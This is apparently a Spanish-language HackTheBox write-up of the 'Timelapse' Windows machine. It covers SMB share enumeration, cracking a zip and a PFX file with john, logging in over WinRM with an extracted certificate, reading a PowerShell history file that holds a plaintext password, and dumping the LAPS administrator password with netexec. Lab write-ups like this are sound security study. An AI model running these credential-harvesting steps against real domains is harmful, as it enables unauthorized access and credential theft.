---
title: "Timelapse"
date: "2025-05-15"
tags: ["HackTheBox", "windows", "active directory", "laps", "pfx"]
---

# Timelapse

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FUX8f4cQMP0lzRlzPKfy6%2FTimelapse.png?alt=media&#x26;token=23875d92-3665-4aa4-99da-8c9ecf64aa3c" alt=""><figcaption></figcaption></figure>

## Enumeración

```bash
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-05-08 05:55:02Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-05-08T05:56:42+00:00; +1h42m16s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
49727/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1h42m13s, deviation: 3s, median: 1h42m10s
| smb2-time: 
|   date: 2025-05-08T05:55:57
|_  start_date: N/A
```

### SMB

El servicio smb permite el acceso sin credenciales, podemos corroborarlo con este comando:\\

```bash
netexec smb timelapse.htb -u '' -p ''
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FQlNbQdJ4xiRvjs1Y2qjd%2Fimage.png?alt=media&#x26;token=bca84ef8-040f-4b12-b78e-26c2c654a026" alt=""><figcaption></figcaption></figure>

Ahora con smbmap podemos enumerar que hay ahí dentro:

```bash
smbmap -H timelapse.htb -u 'a' -p ''
```

Podemos ver que tenemos acceso de lectura a un recurso compartido llamado SHARES:

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FDiHxlXqbpnXw2I1dkWPS%2Fimage.png?alt=media&#x26;token=0f497788-790d-4496-a630-bf3e0a934e3a" alt=""><figcaption></figcaption></figure>

Si enumeramos mas en profundidad ese recurso compartido podremos ver 2 carpetas dentro:

```bash
smbmap -H timelapse.htb -u 'a' -p '' -r Shares
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2F3AgG9GFqJMdo8uUkBmWO%2Fimage.png?alt=media&#x26;token=48abff6b-a825-4fd6-9aa4-8b2be407c89a" alt=""><figcaption></figcaption></figure>

El si enumeramos cada uno podemos ver como la carpeta Dev tiene el archivo `winrm_backup.zip`

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2Fkwlmwml8JS3BybopM1jV%2Fimage.png?alt=media&#x26;token=40678717-cf73-45c1-a891-d4bba459b2df" alt=""><figcaption></figcaption></figure>

Vamos a llevarnos este archivo a nuestro equipo local y vamos a descomprimirlo:

```bash
smbclient \\\\timelapse.htb\\Shares\\Dev
smb:> get winrm_backup.zip
```

## Explotación

### ZIP

Si intentamos extraer el archivo podemos ver que está protegido por contraseña

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2Fq4nsXezGqOQzW1eAUK2Q%2Fimage.png?alt=media&#x26;token=7fc26234-22b1-49a3-943f-6e20b8d907d4" alt=""><figcaption></figcaption></figure>

Con zip2john podemos tratar de conseguir un hash crackeable y crackearlo offline.

```
zip2john winrm_backup.zip > hash.txt
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FPR1B7FKFwRthNESKwjte%2Fimage.png?alt=media&#x26;token=5ae9b7cc-1094-4a09-a84e-348392aad43b" alt=""><figcaption></figcaption></figure>

### PFX

Esto nos va a extraer un archivo `.pfx` llamado `legacyy_dev_auth.pfx` . Los archivos pfx son la fusión de 2 archivos, un certificado digital y su clave privada.

Usamos el siguiente comando para sacar ambos archivos del pfx:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -out priv-key.pem -nodes
```

Nos vuelve a pedir contraseña por que las claves privadas tienen contraseña y estamos pidiendo con el argumento -nodes que nos la extraiga sin contraseña.

Podemos intentar volver a romperla con john de la misma manera que antes:

```bash
pfx2john legacyy_dev_auth.pfx > hash.txt
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FegXCKtMt8IauiqGW9z3A%2Fimage.png?alt=media&#x26;token=abacb137-b261-4bf2-9202-ebc5077b1936" alt=""><figcaption></figcaption></figure>

y ahora ya podremos extraer el certificado y la clave:\\

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificado.pem -nodes
(sacamos certificado)
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out clave.pem -nodes
(sacamos clave)
```

Ahora que tenemos el certificado y la clave podemos intentar conectarnos por Remote Management a ver si funciona.

```bash
evil-winrm -i 10.10.11.152 -c certificado.pem -k clave.pem -S
```

> el argumento -S es porque queremos autenticarnos contra el winrm del puerto 4896 y no el del 4895

Y tendrémos una shell con el usuario legacy! Ahora podemos ver la user.txt

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FqziOvtgs3lxDPUSlZQ2A%2Fimage.png?alt=media&#x26;token=22356d02-17c9-4c33-b7c3-b2b6d17c1d9d" alt=""><figcaption></figcaption></figure>

## Escalada

### Enumeración de usuarios

Ahora que  tenemos una shell podemos con net users ver los usuarios y investigar un poco:

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FEen9y2vkxaGWZQvZ9W4V%2Fimage.png?alt=media&#x26;token=a91ae01f-e5a5-44b4-86fc-3e93365aacfb" alt=""><figcaption></figcaption></figure>

Si inspeccionamos un poco los usuarios con `net user`  podemos ver que el usuario svc\_deploy está en un grupo llamado `LAPS_Readers` .&#x20;

LAPS (Local Administrator Password Solution) es una herramienta de Microsoft que permite gestionar y hacer copias de seguridad de las contraseñas de las cuentas de administrador local en equipos que están unidos a un dominio de Active Directory. Como se puede observar, suena a que es un grupo crítico.

Existen herramientas para explotar usuarios con este grupo pero necesitamos las credenciales de ese usuario primero.

### Historial de PowerShell

SI miramos el historial de PowerShell del usuario legacy podemos observar la contraseña del usuario svc\_deploy:

```bash
type C:\Users\legacyy\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FnvXTY1V59haWizRPNTk8%2Fimage.png?alt=media&#x26;token=5b8497ee-64c3-4f32-820b-b1f581a59902" alt=""><figcaption></figcaption></figure>

Comprobamos si las credenciales son correctas:

```bash
netexec ldap timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FsXQOW7kqhGYKniTtYLvL%2Fimage.png?alt=media&#x26;token=2ae7ab93-b46b-4b71-9e76-0dfc9091ba98" alt=""><figcaption></figcaption></figure>

Y efectivamente es valido. Ahora que ya tenemos las credenciales de su usuario ya podemos empezar a explotar el LAPS.

### LAPS

Como había mencionado anteriormente hay herramientas especificas que explotan esto pero `netexec`  ya ofrece esa función así que vamos a utilizarlo:

```bash
netexec ldap timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
```

> La clave está en el parametro -M que es para indicar un modulo, y ahí ponemos el modulo laps que trae incluido netexec.

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FVYXN4f8SWXY0kyviF1bK%2Fimage.png?alt=media&#x26;token=11d2651c-0ec4-4295-8e72-8c3a0e4a1d6b" alt=""><figcaption></figcaption></figure>

Como podemos ver nos ha dumpeado una contraseña, que muy seguramente sea del administrador, vamos a comprobarlo:

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FvFr2yumeI7Pq5QaZikyC%2Fimage.png?alt=media&#x26;token=c593a464-68b8-46ec-97d2-3486170e9211" alt=""><figcaption></figcaption></figure>

Y efectivamente, ahora vamos a intentar a ver si podemos conectarnos pon winrm para obetener una shell:

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FhoJTl36AuPDi6lZddjlN%2Fimage.png?alt=media&#x26;token=2a12a67e-e29a-4a8e-985a-790a370da894" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2F1YWcaHZ5QJE6dRzT8sQr%2Fimage.png?alt=media&#x26;token=2c2a7f29-b6e1-4a8c-abe4-89f01e8abb4a" alt=""><figcaption></figcaption></figure>

Ahora ya tenemos acceso a `root.txt`&#x20;

<figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2Fwe3JAxsebo3hCLTvbple%2Fimage.png?alt=media&#x26;token=028bfd7b-a9c2-4ef7-b842-c0089d685817" alt=""><figcaption></figcaption></figure>

Y así la maquina estará Pwned! Gracias por leer!
